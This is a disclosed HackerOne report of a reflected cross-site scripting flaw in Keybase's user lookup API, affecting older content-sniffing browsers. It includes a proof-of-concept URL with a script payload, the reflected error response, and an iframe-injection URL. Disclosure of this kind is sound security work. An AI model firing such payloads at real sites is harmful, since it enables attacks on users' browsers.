@@ -1,0 +1,23 @@
+ReportLink:https://hackerone.com/reports/92915
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/geeknik
+ReportedTo:Keybase(keybase)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:30.10.2015 22:34:47
+
+Summary:
+
+This xss issue only affects content sniffing browsers (older versions that don't see the X-Content-Type-Options: nosniff header that you're sending.
+
+https://keybase.io/_/api/1.0/user/lookup.json?usernames=fake_user1%2cfake_user2'%22()%26%25<acx><ScRiPt%20>prompt(/XSS/)</ScRiPt>
+
+This returns a page that contains this information:
+{"status":{"code":100,"desc":"missing or invalid input","fields":{"usernames":"bad list value: fake_user2'\"()&%<acx><ScRiPt >prompt(/XSS/)</ScRiPt>"},"name":"INPUT_ERROR"}}
+
+I've attached the screenshot showing the behavior. 
+
+Iframe injection may also be possible as seen via this url and another attached screenshot.
+
+/_/api/1.0/user/lookup.json?usernames=fake_user1%2cfake_user2'%22()%26%25<acx><iframe%20src=https://www.geeknik.com></iframe></ScRiPt>
